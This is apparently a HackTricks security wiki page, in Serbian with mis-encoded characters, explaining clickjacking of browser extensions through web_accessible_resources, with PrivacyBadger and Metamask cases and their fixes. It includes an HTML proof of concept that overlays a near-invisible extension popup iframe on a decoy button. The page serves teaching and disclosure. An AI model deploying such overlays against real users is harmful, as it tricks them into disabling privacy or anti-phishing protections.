# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Ova stranica Ä‡e iskoristiti ClickJacking ranjivost u ekstenziji pretraÅ¾ivaÄa.\
Ako ne znate Å¡ta je ClickJacking, proverite:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Ekstenzije sadrÅ¾e datoteku **`manifest.json`** i ta JSON datoteka ima polje `web_accessible_resources`. Evo Å¡ta [Chrome dokumentacija](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) kaÅ¾e o tome:

> Ovi resursi bi zatim bili dostupni na veb stranici putem URL-a **`chrome-extension://[PACKAGE ID]/[PATH]`**, koji se moÅ¾e generisati pomoÄ‡u **`extension.getURL method`**. Resursi na beloj listi se isporuÄuju sa odgovarajuÄ‡im CORS zaglavljima, tako da su dostupni putem mehanizama kao Å¡to je XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** u ekstenziji pretraÅ¾ivaÄa nisu dostupni samo putem veba; oni takoÄ‘e funkcioniÅ¡u sa inherentnim privilegijama ekstenzije. To znaÄi da imaju sposobnost da:

* Promene stanje ekstenzije
* UÄitaju dodatne resurse
* Interaguju sa pretraÅ¾ivaÄem do odreÄ‘ene mere

MeÄ‘utim, ova funkcija predstavlja bezbednosni rizik. Ako resurs unutar **`web_accessible_resources`** ima bilo kakvu znaÄajnu funkcionalnost, napadaÄ bi potencijalno mogao da ugradi ovaj resurs u eksternu veb stranicu. Neoprezni korisnici koji posete ovu stranicu mogli bi nenamerno aktivirati ovaj ugraÄ‘eni resurs. Takva aktivacija mogla bi dovesti do nepredviÄ‘enih posledica, u zavisnosti od dozvola i moguÄ‡nosti resursa ekstenzije.

## PrivacyBadger Example

U ekstenziji PrivacyBadger, identifikovana je ranjivost povezana sa `skin/` direktorijumom koji je proglaÅ¡en kao `web_accessible_resources` na sledeÄ‡i naÄin (Proverite originalni [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ova konfiguracija je dovela do potencijalnog bezbednosnog problema. Konkretno, `skin/popup.html` datoteka, koja se prikazuje prilikom interakcije sa ikonom PrivacyBadger u pretraÅ¾ivaÄu, mogla bi biti ugraÄ‘ena unutar `iframe`. Ova ugradnja bi mogla biti iskoriÅ¡Ä‡ena da prevari korisnike da nenamerno kliknu na "OnemoguÄ‡i PrivacyBadger za ovu veb stranicu". Takva akcija bi kompromitovala privatnost korisnika onemoguÄ‡avanjem zaÅ¡tite PrivacyBadger i potencijalno izloÅ¾ila korisnika poveÄ‡anom praÄ‡enju. Vizuelna demonstracija ovog eksploata moÅ¾e se pogledati u ClickJacking video primeru koji je dostupan na [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Da bi se reÅ¡ila ova ranjivost, implementirano je jednostavno reÅ¡enje: uklanjanje `/skin/*` sa liste `web_accessible_resources`. Ova promena je efikasno smanjila rizik osiguravajuÄ‡i da sadrÅ¾aj direktorijuma `skin/` ne moÅ¾e biti pristupljen ili manipulisan putem resursa dostupnih na mreÅ¾i.

ReÅ¡enje je bilo jednostavno: **ukloniti `/skin/*` iz `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Primer

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). U ovom sluÄaju, Metamask je ispravio ranjivost proverom da li je protokol koji se koristi za pristup **`https:`** ili **`http:`** (ne **`chrome:`** na primer):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**JoÅ¡ jedan ClickJacking ispravljen** u Metamask ekstenziji bio je taj Å¡to su korisnici mogli da **Click to whitelist** kada je stranica bila sumnjiva da je phishing zbog `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`. Kako je ta stranica bila ranjiva na Clickjacking, napadaÄ je mogao da je zloupotrebi prikazujuÄ‡i neÅ¡to normalno kako bi naterao Å¾rtvu da klikne da je stavi na belu listu bez da primeti, a zatim se vraÄ‡ajuÄ‡i na phishing stranicu koja Ä‡e biti stavljena na belu listu.

## Steam Inventory Helper Primer

Proverite sledeÄ‡u stranicu da biste videli kako je **XSS** u ekstenziji pretraÅ¾ivaÄa povezan sa **ClickJacking** ranjivoÅ¡Ä‡u:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Reference

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
